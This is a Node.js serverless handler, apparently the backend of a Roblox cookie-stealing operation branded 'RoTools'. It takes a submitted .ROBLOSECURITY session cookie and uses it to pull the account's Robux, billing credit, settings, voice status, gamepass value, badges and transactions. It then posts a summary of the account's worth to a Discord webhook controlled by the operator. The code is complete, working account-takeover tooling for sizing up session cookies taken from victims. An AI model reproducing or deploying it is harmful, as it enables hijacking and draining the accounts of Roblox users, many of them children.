import fetch from 'node-fetch';

export default async function handler(req, res) {
    if (req.headers.authorization !== 'Bearer secure-token-2025') {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { cookie } = req.body;
        if (!cookie) {
            return res.status(400).json({ error: 'No cookie provided' });
        }

        const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });

        if (!userRes.ok || userRes.status === 401) {
            return res.json({
                success: false,
                error: 'Invalid cookie - authentication failed'
            });
        }

        const userData = await userRes.json();
        const userId = userData.id;

        const [
            robuxRes,
            creditRes,
            settingsRes,
            friendsRes,
            voiceRes,
            gamepassesRes,
            badgesRes,
            transactionsRes,
            thumbnailRes
        ] = await Promise.all([
            fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
            }),
            fetch('https://billing.roblox.com/v1/credit', {
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
            }),
            fetch('https://www.roblox.com/my/settings/json', {
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
            }),
            fetch(`https://friends.roblox.com/v1/my/friends/count`, {
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
            }),
            fetch('https://voice.roblox.com/v1/settings', {
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
            }),
            fetch(`https://www.roblox.com/users/inventory/list-json?assetTypeId=34&cursor=&itemsPerPage=100&pageNumber=1&userId=${userId}`, {
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
            }),
            fetch(`https://accountinformation.roblox.com/v1/users/${userId}/roblox-badges`, {
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
            }),
            fetch(`https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`, {
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
            }),
            fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?size=48x48&format=png&userIds=${userId}`)
        ]);

        const robuxData = await robuxRes.json();
        const creditData = await creditRes.json();
        const settingsData = await settingsRes.json();
        const friendsData = await friendsRes.json();
        const voiceData = await voiceRes.json();
        const gamepassesData = await gamepassesRes.text();
        const badgesData = await badgesRes.text();
        const transactionsData = await transactionsRes.json();
        const thumbnailData = await thumbnailRes.json();

        const account_gamepasses_worth = (gamepassesData.match(/"PriceInRobux":(\d+)/g) || [])
        .reduce((sum, match) => sum + parseInt(match.split(':')[1]), 0);

        const account_badges = (badgesData.match(/"name":"(.*?)"/g) || [])
        .map(match => match.split('"')[3])
        .join(', ') || 'None';

        const accountInfoEmbed = {
            title: ":white_check_mark: Account Information",
            description: `Detailed account information for ${settingsData.Name}`,
            color: 0x38d13b,
            thumbnail: { url: thumbnailData.data[0].imageUrl },
            fields: [
                { name: ":money_mouth: Robux", value: `${robuxData.robux}`, inline: true },
                { name: ":moneybag: Balance", value: `${creditData.balance} ${creditData.currencyCode}`, inline: true },
                { name: "Account Name", value: `${settingsData.Name} (${settingsData.DisplayName})`, inline: true },
                { name: "Account Age", value: `${(settingsData.AccountAgeInDays / 365).toFixed(2)} years`, inline: true },
                { name: "Premium", value: `${settingsData.IsPremium ? '✅' : '❌'}`, inline: true },
                { name: "Voice Verified", value: `${voiceData.isVerifiedForVoice ? '✅' : '❌'}`, inline: true },
                { name: "Gamepasses Worth", value: `${account_gamepasses_worth} R$`, inline: true },
                { name: "Badges", value: account_badges.substring(0, 100) + (account_badges.length > 100 ? '...' : ''), inline: true }
            ],
            footer: {
                text: "RoTools v2.4 | Secure Processing"
            },
            timestamp: new Date().toISOString()
        };

        await fetch(process.env.DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [accountInfoEmbed] })
        });

        return res.json({ success: true });

    } catch (error) {
        console.error('Server error:', error);
        return res.status(500).json({
            success: false,
            error: error.message || 'Internal server error'
        });
    }
}
